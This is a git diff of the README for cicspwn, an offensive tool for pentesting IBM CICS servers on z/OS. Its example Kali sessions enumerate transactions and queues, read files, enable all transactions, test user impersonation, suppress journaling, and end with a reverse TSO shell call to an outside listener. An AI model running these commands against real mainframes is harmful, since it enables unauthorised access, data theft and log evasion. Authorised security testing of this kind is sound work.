@@ -24,14 +24,6 @@ $python cicspwn.py -h
       
                             The tool for some CICS p0wning !		Author: @Ayoul3__
 
-usage: cicspwn.py [-h] [-a APPLID] [-i] [-t] [-f] [-p PATTERN] [-U USERID]
-                  [-P PASSWORD] [--get-file FILENAME]
-                  [--enable-trans ENA_TRANS] [-q] [-u] [-g SURROGAT_USER]
-                  [-r PROPAGATE_USER] [-s SUBMIT] [--queue QUEUE]
-                  [--ftp-cmds FTP_CMDS] [--node NODE] [-l LHOST] [--port PORT]
-                  [-j JCL]
-                  IP PORT
-
 CicsPwn: a tool to pentest CICS transaction servers on z/OS
 
 positional arguments:
@@ -42,30 +34,44 @@ optional arguments:
   -h, --help            show this help message and exit
   -a APPLID, --applid APPLID
                         CICS ApplID on VTAM, default is CICS
-  -i, --info            Gather information about a CICS region
-  -t, --trans           Get all installed transactions on a CICS TS server
-  -f, --files           List all installed files a on TS CICS
+
+Information gathering:
+  -A, --all             Gather all information about a CICS Transaction Server
+  -i, --info            Gather basic information about a CICS region
+  -u, --userids         Scrape userids found in different menus
   -p PATTERN, --pattern PATTERN
-                        Specify a pattern of a files/transaction to get
-                        (default is "*")
+                        Specify a pattern of a files/transaction/tsqueue to
+                        get (default is "*")
+  -q, --quiet           Remove Trailing and journal before performing any
+                        action
+
+Storage options:
+  -f, --files           List all installed files a on TS CICS
+  -e, --tsqueues        List all temporary storage queues on TS CICS
+  --get-file FILENAME   Get the content of a file. It attempts to change the
+                        status of the file if it's not enabled, opened or
+                        readable
+  --get-tsq TSQ_NAME    Get the content of a temporary storage queue.
+  --enable-files ENA_FILES
+                        Enable a file (keyword ALL to enable every file)
+
+Transaction options:
+  -t, --trans           Get all installed transactions on a CICS TS server
+  --enable-trans ENA_TRANS
+                        Enable a transaction (keyword ALL to enable every
+                        transaction)
+
+Access options:
   -U USERID, --userid USERID
                         Specify a userid to use on CICS
   -P PASSWORD, --password PASSWORD
                         Specify a password for the userid
-  --get-file FILENAME   Get the content of a file. It attempts to change the
-                        status of the file if it's not enabled, opened or
-                        readable
-  --enable-trans ENA_TRANS
-                        Enable a single transaction
-  -q, --quiet           Remove Trailing and journal before performing any
-                        action
-  -u, --userids         Scrape userids found in different menus
-  -g SURROGAT_USER, --surrogat SURROGAT_USER
-                        Checks wether you can impersonate another user when
-                        submitting a job
-  -r PROPAGATE_USER, --propagateUser PROPAGATE_USER
-                        Given the region user ID, checks wether you are
+  -r PROPAGATE_USER     Given the region user ID, checks wether you are
                         allowed to use it to submit JOBs
+  -g SURROGAT_USER      Checks wether you can impersonate another user when
+                        submitting a job
+
+JOB options:
   -s SUBMIT, --submit SUBMIT
                         Submit JCL to CICS server. Specify:
                         dummy,reverse_unix, reverse_tso, direct_unix,
@@ -87,33 +93,76 @@ optional arguments:
 ## Getting general information
 ```
 root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -i
-[+] Connecting to target 192.168.1.209:23
+[+] Connecting to target 192.168.1.207:23
 [*] Access to CICS Terminal is possible with APPID CICS
 [+] Getting information about CICS server (APPLID: CICS)
-	[*] CICS TS Version 3.2
-[+] Available IBM supplied transactions: 
+	[*] CICS TS Version: 3.2
+	[*] CICS default user: CICSUSER
+[+] Interesting and available IBM supplied transactions: 
 	[*] CEMT
-	[*] CECI
 	[*] CEDA
-	[*] CEDF
+	[*] CECI
+	[*] CECS
+	[*] CEBR
 [+] General system information: 
 	[*] Userid: CICSUSER
 	[*] Sysid: S650
-	[*] LU session name: LCL704
+	[*] LU session name: LCL702
 	[*] language: E
 	[*] Files HLQ:	CICS650.**
 	[*] Library path:	DFH320.CICS.**
 [+] Active users
 	[*] CICSUSER
 	[*] CICSUSER
+	[*] CICSUSER
 [+] JCL Submission
-	[*] Access to internal spool is apparently available
-	[*] Transiant queue to access spool is apparently available
-		[*] When submitting a job, provide the option --inreader=IRDR
+	[*] Access to the internal spool is apparently available
 [+] Access control
-	[+] CICS uses an ESM (RACF/ACF2/TopSecret), might be tricky to access some functions
+	[*] CICS does not use RACF/ACF2/TopSecret. Every user has as much access as the CICS region ID
+
 ```
-## Reverse shell using CICS
+## Read a file
+```
+root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 --get-file FILEA
+[+] Connecting to target 192.168.1.207:23
+[*] Access to CICS Terminal is possible with APPID CICS
+[+] Getting Attributes of file FILEA
+[*] File FILEA is enabled, open, and readable
+[*] Record size: 80	keylength:6
+RECORD 1
+RECORD 2
+...
+
+```
+
+## List TSQueues
+```
+root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -e
+[+] Connecting to target 192.168.1.207:23
+[*] Access to CICS Terminal is possible with APPID CICS
+[+] Getting all tsqueues that match *
+Tsqueue	Items	Length	Transaction
+KOS5	00001	0000000064	CECI
+TEST	00001	0000000064	CECI
+TES5	00001	0000000064	CECI
+...
+
+```
+
+## List TSQueues
+```
+root@kali:~/cics# python cicspwn.py 192.168.1.207 23 -a CICS -U AYOUB -P AYOU1 --enable-tran ALL
+[+] Connecting to target 192.168.1.207:23
+[*] Access to CICS Terminal is possible with APPID CICS
+[*] Successful authentication
+[+] Activating ALL transactions
+[*] All transactions are enabled
+
+...
+
+```
+
+## Reverse shell using CICSpwn
 ```
 root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -s reverse_tso -l 192.168.1.16:4445
 [+] Connecting to target 192.168.1.209:23
